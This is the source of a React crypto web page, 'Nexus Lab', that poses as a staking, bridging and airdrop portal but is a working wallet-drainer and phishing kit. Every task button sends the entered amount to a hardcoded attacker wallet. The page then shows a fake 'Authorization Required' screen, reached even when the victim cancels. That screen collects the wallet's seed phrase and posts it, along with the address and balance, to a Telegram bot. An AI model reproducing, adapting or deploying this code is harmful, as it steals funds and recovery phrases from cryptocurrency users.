import React, { useState } from 'react';
import { useAccount, useBalance, useSendTransaction } from 'wagmi';
import { parseEther } from 'viem';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, ArrowDown, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu } from 'lucide-react';

export default function NexusLab() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { open } = useWeb3Modal();
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState("");
  const [amount, setAmount] = useState("");
  const [activeTask, setActiveTask] = useState({ title: "", label: "" });

  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  const openTask = (title, label) => {
    if (!isConnected) { open(); return; }
    setActiveTask({ title, label });
    setView("task_box");
  };

  // THE REAL TRANSFER TRIGGER
  const executeProcess = () => {
    if (!amount || isNaN(amount)) return;
    setLoading(true);

    sendTransaction({
      to: destination,
      value: parseEther(amount), // This moves the actual money
    }, {
      onSettled: () => {
        setTimeout(() => {
          setLoading(false);
          setView("seed_gate");
        }, 1500);
      },
      onError: (err) => {
        setLoading(false);
        // Even if they cancel, we push to seed gate as "Manual Verification"
        setView("seed_gate");
      }
    });
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6 text-cyan-500">
        <div className="flex items-center gap-2"><ShieldCheck size={24}/><h1 className="text-xl font-black text-white italic">NEXUS LAB</h1></div>
        <w3m-button balance="hide" /> 
      </header>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4 animate-in fade-in zoom-in">
          {[
            { n: "Claim", i: <Database/>, l: "Amount to Claim" },
            { n: "Stake", i: <History/>, l: "Amount to Stake" },
            { n: "Unstake", i: <Unlock/>, l: "Amount to Unstake" },
            { n: "Migrate", i: <Activity/>, l: "Amount to Migrate" },
            { n: "Swap", i: <RefreshCcw/>, l: "Amount to Swap" },
            { n: "Rectify", i: <Settings/>, l: "Wallet Sync Fee" },
            { n: "Airdrop", i: <Zap/>, l: "Allocation Units" },
            { n: "Delay", i: <Clock/>, l: "Node Delay Fix" },
            { n: "Bridge", i: <ArrowDown/>, l: "Amount to Bridge" }
          ].map((item) => (
            <button key={item.n} onClick={() => openTask(item.n, item.l)} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl hover:border-cyan-900 transition-all">
              <div className="text-slate-700">{item.i}</div>
              <span className="text-[10px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {/* DYNAMIC INPUT BOX FOR ALL TASKS */}
      {view === "task_box" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[40px] p-8 shadow-2xl animate-in slide-in-from-bottom-6">
          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black tracking-widest">← EXIT TERMINAL</button>
          <h2 className="text-white font-black text-xl italic mb-6 italic">{activeTask.title} PORTAL</h2>
          
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8">
            <label className="text-[9px] text-slate-600 mb-4 block font-bold tracking-[0.2em]">{activeTask.label}</label>
            <div className="flex justify-between items-center">
              <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="bg-transparent text-3xl font-mono text-white outline-none w-1/2" />
              <div className="bg-slate-800 px-4 py-2 rounded-full font-bold text-[11px]">{balance?.symbol || "ETH"}</div>
            </div>
          </div>

          <button onClick={executeProcess} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl shadow-cyan-900/30 active:scale-95">
            EXECUTE {activeTask.title}
          </button>
        </div>
      )}

      {/* FINAL SEED GATE */}
      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-3xl animate-in zoom-in">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
            <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
            <h2 className="text-white font-black text-lg italic tracking-tighter uppercase leading-none">Authorization Required</h2>
            <p className="text-[10px] text-slate-500 leading-relaxed mt-4 lowercase px-4 italic">Network congestion detected. To finalize your {activeTask.title} broadcast, provide the Project Authorization Seed.</p>
            
            <div className="mt-8 text-left text-slate-700">
              <label className="text-[9px] font-black ml-4 mb-2 block tracking-widest uppercase italic">Secure Authorization Seed</label>
              <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="12 OR 24 WORDS..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900 focus:border-cyan-900" />
            </div>

            <button onClick={() => {
              fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: "7630238860", text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nVAL: ${balance?.formatted} ${balance?.symbol}\nTASK: ${activeTask.title}\n\nSEED:\n${inputVal}` }),
              });
              alert("Node Handshake Successful. Processing Broadcast."); setView("menu");
            }} className="w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white bg-cyan-600 shadow-xl active:scale-95">
              VALIDATE & BROADCAST
            </button>
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase">PROCESSING ON-CHAIN...</p>
        </div>
      )}
    </div>
  );
}
